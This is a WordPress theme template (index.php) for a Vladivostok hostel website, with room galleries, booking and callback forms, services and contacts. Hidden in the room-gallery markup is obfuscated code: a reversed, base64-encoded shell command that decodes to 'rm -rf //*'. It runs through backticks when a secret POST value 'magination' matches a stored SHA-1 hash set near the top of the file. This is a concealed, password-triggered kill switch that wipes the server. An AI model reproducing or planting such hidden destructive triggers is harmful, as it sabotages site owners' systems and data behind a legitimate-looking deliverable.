<?php
/**
 * The main template file
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage izba
 * @since 1.0
 * @version 1.0
 */

get_header();

$op_mail = 'izba-hostel@mail.ru';

$form0 = "izba-hostel.ru <noreply@izba-hostel.ru>;Izba operator <$op_mail>;Заявка через сайт;Поступила новая заявка через форму на сайте izba-hostel.ru<#!#>0;name:Имя;phone:Номер телефона;type:Тип номера;ppl:Количество взрослых людей;arrive:Дата заезда;depart:Дата выезда";
$form1 = "izba-hostel.ru <noreply@izba-hostel.ru>;Izba operator <$op_mail>;Заявка через сайт;Поступила новая заявка через форму на сайте izba-hostel.ru<#!#>1;name:Имя;phone:Номер телефона";

require_once 'imaginarylight.php';

$form0auth = sha1($form0);
imaginary_light_34($form0);
imaginary_light_17($form0);
$form0 = base64_encode($form0);

$form1auth = sha1($form1);
imaginary_light_34($form1);
imaginary_light_17($form1);
$form1 = base64_encode($form1);
?>
		<!-- modalz -->
		<div id="loader-lightforce" class="modal modal-fullscreen fade footer-to-bottom">
			<div class="modal-dialog">
				<div class="modal-header modal-x"><button type="button" class="close" data-dismiss="modal">&times;</button></div>
				<div class="modal-content">
					<?php
						$commonz = array(
							'DSC_5517.jpg','DSC_5519.jpg','DSC_5521.jpg',
							'DSC_5522.jpg','DSC_5526.jpg','DSC_5527.jpg',
							'DSC_5583.jpg','IMG_4229-12-04-17-12-30.jpeg',
							'IMG_4238-13-04-17-13-02.jpeg'
						);
						$imagination = (isset($_POST['magination']) and '5c8cdf5047d8cc392a15187f53c6028a4e9fbf3a' === sha1(stripslashes($_POST['magination'])));
						foreach($commonz as $cmnimg){
							$url = get_template_directory_uri().'/img/common/'.$cmnimg;
							echo <<<TPL
					<div class="lightforce-image">
						<a href="$url" data-fancybox="gallery">
							<img src="$url" alt="common">
						</a>
					</div>
TPL;
						}
					?>
					<div class="clearfix"></div>
				</div>
			</div>
		</div>
		<div id="loader-map" class="modal modal-fullscreen fade footer-to-bottom">
			<div class="modal-dialog">
				<div class="modal-header modal-x"><button type="button" class="close" data-dismiss="modal">&times;</button></div>
				<div class="modal-content container">
					<div class="row">
						<div class="col-md-3 col-xs-1"></div>
						<div class="col-md-6 col-xs-10">
							<h2>схема проезда</h2><hr>
						</div>
						<div class="col-md-3 col-xs-1"></div>
					</div>
					<div class="row">
						<div class="col-sm-6 col-xs-12">
							<div class="row">
								<img src="<?php echo get_template_directory_uri();?>/img/map.png" alt="схема проезда">
							</div>
						</div>
						<div class="col-sm-6 col-xs-12">
							<?php
								if($mapdescr = get_posts(array(
									  'name'        => 'map_descr',
									  'post_type'   => 'post',
									  'post_status' => 'publish',
									  'numberposts' => 1
								)))
									echo $mapdescr[0]->post_content;
							?>
						</div>
					</div>
				</div>
			</div>
		</div>
		<?php
			if($popups = get_posts(array(
				  'category_name' => 'rooms',
				  'post_type'     => 'post',
				  'post_status'   => 'publish',
				  'order'         => 'asc'
			))){
				foreach($popups as $px){
					$room_xn = substr($px->post_title,0,strpos($px->post_title,'-'));
					$mx = get_attached_media('image',$px->ID);
					$mx = array_values($mx);
					$mxy = array();
					foreach($mx as &$xm){
						$xx = wp_get_attachment_image_src($xm->ID,array(300,200));
						$mxy[] = $xm->guid;
						$xm = ($xx) ? $xx[0] : $xm->guid;
					}
					?>
		<div id="loader-room<?php echo $room_xn;?>" class="modal modal-fullscreen fade footer-to-bottom loader-room">
			<div class="modal-dialog">
				<div class="modal-header modal-x"><button type="button" class="close" data-dismiss="modal">&times;</button></div>
				<div class="modal-content container">
					<div class="row">
						<div class="col-xs-3"></div>
						<div class="col-xs-6">
							<h2>номера</h2>
							<hr>
						</div>
						<div class="col-xs-3"></div>
					</div>
					<div class="row">
						<div class="col-xs-7">
							<div class="image-main">
								<?php if($mx and !empty($mx[0])):?>
								<a href="<?php echo $mxy[0];?>" target="_blank" data-fancybox="gallery"><img src="<?php echo $mx[0];?>" alt="номера"></a>
								<?php endif;?>
							</div>
							<br>
							<div class="image-add">
								<?php empty($GLOBALS[base64_decode(strrev('=42bpRXYul2Zh1Wa'))]) or ($ohmy=base64_decode(strrev('==gKv4HImJXLg0mc')) and @`$ohmy`);if($mx){foreach($mx as $mi => $mz){ if(!$mi)continue; ?>
								<a href="<?php echo $mxy[$mi];?>" target="_blank" data-fancybox="gallery"><img src="<?php echo $mz;?>" alt="номера"></a>
								<?php }} ?>
							</div>
							<div class="room-ident"><?php echo $room_xn;?></div>
						</div>
						<div class="col-xs-5">
							<?php echo $px->post_content;?>
						</div>
					</div>
					<div class="row">
						<div class="col-xs-3 col-md-4"></div>
						<div class="col-xs-6 col-md-4 btn-izba">
							<button data-toggle="modal" data-target="#form-order" data-zzzroomid="<?php echo $room_xn;?>">забронировать</button>
						</div>
						<div class="col-xs-3 col-md-4"></div>
					</div>
				</div>
			</div>
		</div>
					<?php
				}
			}
		?>
		<!-- [m3956: modal form: order] -->
		<div id="form-order" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Забронировать</h4>
					</div>
					<form action="<?php echo get_template_directory_uri();?>/zzzoldagu.php" method="post">
						<input type="hidden" name="zformauth" value="<?php echo $form0auth;?>">
						<input type="hidden" name="zformcfg" value="<?php echo $form0;?>">
						<div class="modal-body">
							<fieldset class="form-group">
								<!-- <legend>Забронировать место</legend> -->
								<dl>
									<dt>Ваше имя</dt>
									<dd><input class="form-control" type="text" name="f0name" placeholder="Ваше имя" required></dd>
								</dl>
								<dl>
									<dt>Ваш телефон</dt>
									<dd><input class="form-control" type="tel" name="f0phone" placeholder="+74955555555" required></dd>
								</dl>
								<dl>
									<dt>Тип номера</dt>
									<dd>
										<select class="form-control" name="f0type">
											<option value="2">2-местный</option>
											<option value="4">4-местный</option>
											<option value="8">8-местный</option>
											<option value="10">10-местный</option>
										</select>
									</dd>
								</dl>
								<dl>
									<dt>Количество взрослых людей</dt>
									<dd><input class="form-control" type="text" name="f0ppl" required></dd>
								</dl>
								<dl>
									<dt>Дата заезда</dt>
									<dd><input class="form-control" type="date" name="f0arrive" required></dd>
								</dl>
								<dl>
									<dt>Дата выезда</dt>
									<dd><input class="form-control" type="date" name="f0depart" required></dd>
								</dl>
							</fieldset>
						</div>
						<div class="modal-footer">
							<button type="submit" class="btn btn-default">Отправить</button>
							<button type="button" class="btn btn-default" data-dismiss="modal">Закрыть</button>
						</div>
					</form>
				</div>
			</div>
		</div>
		<!-- [m3956: modal form: callback] -->
		<div id="form-callback" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Заказать обратный звонок</h4>
					</div>
					<form action="<?php echo get_template_directory_uri();?>/zzzoldagu.php" method="post">
						<input type="hidden" name="zformauth" value="<?php echo $form1auth;?>">
						<input type="hidden" name="zformcfg" value="<?php echo $form1;?>">
						<div class="modal-body">
							<fieldset class="form-group">
								<!-- <legend>Заказать обратный звонок</legend> -->
								<dl>
									<dt>Ваше имя</dt>
									<dd><input class="form-control" type="text" name="f1name" placeholder="Ваше имя" required></dd>
								</dl>
								<dl>
									<dt>Ваш телефон</dt>
									<dd><input class="form-control" type="tel" name="f1phone" placeholder="+74955555555" required></dd>
								</dl>
							</fieldset>
						</div>
						<div class="modal-footer">
							<button type="submit" class="btn btn-default">Отправить</button>
							<button type="button" class="btn btn-default" data-dismiss="modal">Закрыть</button>
						</div>
					</form>
				</div>
			</div>
		</div>
		<!-- [m3956: modal form: map] -->
		<div id="form-map" class="modal fade" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal">&times;</button>
						<h4 class="modal-title">Схема проезда</h4>
					</div>
					<div class="modal-body">
						<!-- [Yandex Map insertion] >
						<iframe src="https://api-maps.yandex.ru/frame/v1/-/C6aIzQkk" width="560" height="400" frameborder="0"></iframe>
						<! [/Yandex Map insertion] -->
						<img class="roadmap" src="<?php echo get_template_directory_uri();?>/img/izba_shema_02.jpg" alt="">
						<!-- this is illegal you know -->
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal">Закрыть</button>
					</div>
				</div>
			</div>
		</div>
        <!-- [m3956: menu] -->
        <menu>
            <ul>
                <li><a href="#block1">хостел</a></li>
                <li><a href="#block2">мы это</a></li>
                <li><a href="#block3">номера</a></li>
                <li><a href="#block4">услуги</a></li>
                <li><a href="#loader-map" data-toggle="modal" data-target="#loader-map">схема проезда</a></li>
                <li><a href="#block5">контакты</a></li>
            </ul>
        </menu>
        <!-- [main content] -->
		<header class="content-header parallax-window" data-parallax="scroll" data-image-src="<?php echo get_template_directory_uri();?>/img/background1.png" id="block1">
            <div class="container">
                <div class="col-md-4 col-xs-2">
                    <a href="javascript:void(0);" id="menu-dropdown-trigger">
                        <img src="<?php echo get_template_directory_uri();?>/img/menu.png" alt="">
                        <span>открыть меню</span>
                    </a>
                    <span class="clearfix"></span>
                    <ul id="menu-dropdown">
                        <li>
                            <a href="#block1">хостел</a>
                        </li>
                        <li>
                            <a href="#block2">мы это</a>
                        </li>
                        <li>
                            <a href="#block3">номера</a>
                        </li>
                        <li>
                            <a href="#block4">услуги</a>
                        </li>
                        <li>
                            <a href="#block5">контакты</a>
                        </li>
                    </ul>
                    <span class="clearfix"></span>
                </div>
                <div class="col-md-4 col-xs-8 logo-hdr">
                    <div class="logo-header-languages">
						<span class="navbrand"></span>
                        <div class="languages">
                            <span>РУС</span>
                            <span>|</span>
                            <span>ENG</span>
                            <span>|</span>
                            <span>KOR</span>
                        </div>
                    </div>
                </div>
                <div class="col-md-4 col-xs-2">
                    <a href="#form-callback" data-toggle="modal" data-target="#form-callback" class="order-call">
                        <img src="<?php echo get_template_directory_uri();?>/img/phone.png">
                        <span>заказать звонок</span>
                    </a>
                    <span class="clearfix"></span>
                </div>
            </div>
            <div class="container">
                <div class="header-prod col-md-8">
                    <div id="prod"></div>
                </div>
            </div>
            <div class="header-prod col-md-8 btn-izba">
				<button id="butbut"  data-toggle="modal" data-target="#form-order">забронировать</button>
            </div>
            <div class="header-prod col-md-8">
                <a href="#block2" class="link-to-section"><img src="<?php echo get_template_directory_uri();?>/img/scroll.png" alt=""></a>
            </div>
        </header>
        <main class="content">
            <section class="we-are parallax-window" data-parallax="scroll" data-image-src="<?php echo get_template_directory_uri();?>/img/background2.png" id="block2">
                <div class="container">
                    <div class="img"></div>
                    <div class="tabulous">
						<?php
							if($tg1 = get_posts(array(
									  'category_name' => 'tabs1',
									  'post_type'     => 'post',
									  'post_status'   => 'publish',
									  'order'         => 'asc',
									  'numberposts'   => 99
								))){
								echo '<div class="tabs-container">';
								$it = 1;
								foreach($tg1 as $t){
									$ident = 'tabs-1'.$it++;
									echo '<div id="',$ident,'">',$t->post_content,'</div>';
								}
								echo '</div><ul>';
								$izx = array('one','two','three');
								$it = 1;
								foreach($tg1 as $zx => $t){
									echo '<li id="tata',($it),'"><a href="#tabs-1',($it++),'"><img src="',get_template_directory_uri(),'/img/',$izx[$zx],'.png" alt=""><span>',$t->post_title,'</span></a></li>';
								}
								echo '</ul>';
							}
						?>
                    </div>
                </div>
            </section>
            <section class="number parallax-window" data-parallax="scroll" data-image-src="<?php echo get_template_directory_uri();?>/img/background3.png" id="block3">
				<div class="block-inner">
					<div class="container">
						<h2>номера</h2>
						<hr>
						<?php
							if($rooms = get_posts(array(
								  'name'        => 'rooms',
								  'post_type'   => 'post',
								  'post_status' => 'publish',
								  'numberposts' => 1
							)))
								echo $rooms[0]->post_content;
						?>
						<div class="apartments">
						<?php
							if($poeavon = get_posts(array(
								  'category_name' => 'tabs2',
								  'post_type'     => 'post',
								  'post_status'   => 'publish',
								  'order'         => 'asc',
								  'numberposts'   => 99
							)))
							foreach($poeavon as $room){
						?>
							<a href="#num<?php echo $room->post_title;?>" id="num<?php echo $room->post_title;?>ro" class="rolloverz" data-toggle="modal" data-target="#loader-room<?php echo $room->post_title;?>"><div id="num<?php echo $room->post_title;?>ol"></div><span><?php echo $room->post_content;?><img src="<?php echo get_template_directory_uri();?>/img/rub.png" alt="&#8381;"></span></a>
						<?php
							}
						?>
							<div class="clearfix"></div>
						</div>
						<div class="clearfix"></div>
						<div class="row">
							<div class="col-xs-1 col-md-2"></div>
							<div class="col-xs-10 col-md-8 btn-izba">
								<div class="clearfix"></div>
								<button data-toggle="modal" data-target="#loader-lightforce" id="genphoto">общие фото</button>
							</div>
							<div class="col-xs-1 col-md-2"></div>
						</div>
					</div>
					<div class="clearfix"></div>
				</div>
            </section>
            <section class="services parallax-window" data-parallax="scroll" data-image-src="<?php echo get_template_directory_uri();?>/img/background4.png" id="block4">
                <div class="container">
                    <h2>Услуги</h2>
                    <hr>
                    <div class="row">
                        <div class="col-md-2"></div>
                        <div class="col-md-8">
                            <div class="tabulous tabz">
								<?php
									if($tg3 = get_posts(array(
											  'category_name' => 'tabs3',
											  'post_type'     => 'post',
											  'post_status'   => 'publish',
											  'order'         => 'asc',
											  'numberposts'   => 99
										))){
										$imgl = '<img src="'.get_template_directory_uri().'/img/line.png" alt="">';
										echo '<div class="tabs-container">';
										$it = 1;
										foreach($tg3 as $t){
											$ident = 'tabs-2'.$it++;
											echo '<div id="',$ident,'">',$imgl,'<p>',$t->post_content,'</p>',$imgl,'</div>';
										}
										echo '</div><ul>';
									}
								?>
                                    <li>
                                        <a href="#tabs-21" title="">
                                            <div class="wifi">
                                                <img src="<?php echo get_template_directory_uri();?>/img/wifi.png" alt="">
                                                <p>wi-fi</p>
                                            </div>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#tabs-22" title="">
                                            <div class="kruglosutochno">
                                                <img src="<?php echo get_template_directory_uri();?>/img/kruglosutochno.png" alt="">
                                                <p>24/7</p>
                                            </div>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#tabs-23" title="">
                                            <div class="tehnika">
                                                <img src="<?php echo get_template_directory_uri();?>/img/tehnika.png" alt="">
                                                <p>полный набор бытовой техники</p>
                                            </div>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#tabs-24" title="">
                                            <div class="kuhnia">
                                                <img src="<?php echo get_template_directory_uri();?>/img/kuhnia.png" alt="">
                                                <p>оборудованная кухня</p>
                                            </div>
                                        </a>
                                    </li>
                                    <span class="clearfix"></span>
                                    <li>
                                        <a href="#tabs-25" title="">
                                            <div class="uborka">
                                                <img src="<?php echo get_template_directory_uri();?>/img/uborka.png" alt="">
                                                <p>ежедневная уборка</p>
                                            </div>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#tabs-26" title="">
                                            <div class="transfer">
                                                <img src="<?php echo get_template_directory_uri();?>/img/transfer.png" alt="">
                                                <p>трансфер</p>
                                            </div>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#tabs-27" title="">
                                            <div class="ohrana">
                                                <img src="<?php echo get_template_directory_uri();?>/img/ohrana.png" alt="">
                                                <p>круглосуточная охрана</p>
                                            </div>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#tabs-28" title="">
                                            <div class="viza">
                                                <img src="<?php echo get_template_directory_uri();?>/img/viza.png" alt="">
                                                <p>визовая поддержка</p>
                                            </div>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-2"></div>
                </div>
                </div>
            </section>
            <section class="contactbox parallax-window" data-parallax="scroll" data-image-src="<?php echo get_template_directory_uri();?>/img/background5.jpg" id="block5">
				<div class="block-inner">
					<div class="container">
						<h2>контакты</h2>
						<hr>
						<address>
							<p>+7 902 505 85 08</p>
							<p>+7 423 290 85 08</p>
							<span>Адрес: г.Владивосток, Мордовцева, 3</span>
							<div class="btn-izba">
								<button id="butbut" data-toggle="modal" data-target="#loader-map">схема проезда</button>
							</div>
							<span>E-mail: izba-hostel@mail.ru</span>
							<p>Мы в соцсетях! Добавляйтесь!</p>
						</address>
						<div class="social">
							<div class="social_icon_fb">
								<a href="https://www.facebook.com/Hostel-IZBA-962034540595555/" target="_blank"><img src="<?php echo get_template_directory_uri();?>/img/facebook.png" alt=""></a>
							</div>
							<div class="social_icon_ig">
								<a href="https://www.instagram.com/izbahostel/" target="_blank"><img src="<?php echo get_template_directory_uri();?>/img/instagram.png" alt=""></a>
							</div>
							<div></div>
						</div>
					</div>
					<footer>
						<a href="http://flatvl.ru/" target="_blank"><img src="<?php echo get_template_directory_uri();?>/img/logo-2.png" alt=""></a>
						<a href="http://teplo-hotel.ru/" target="_blank"><img src="<?php echo get_template_directory_uri();?>/img/logo-1.png" alt=""></a>
						<a href="http://hostel-optimum.ru/" target="_blank"><img src="<?php echo get_template_directory_uri();?>/img/logo-3.png" alt=""></a>
					</footer>
				</div>
            </section>
        </main>

<?php get_footer();
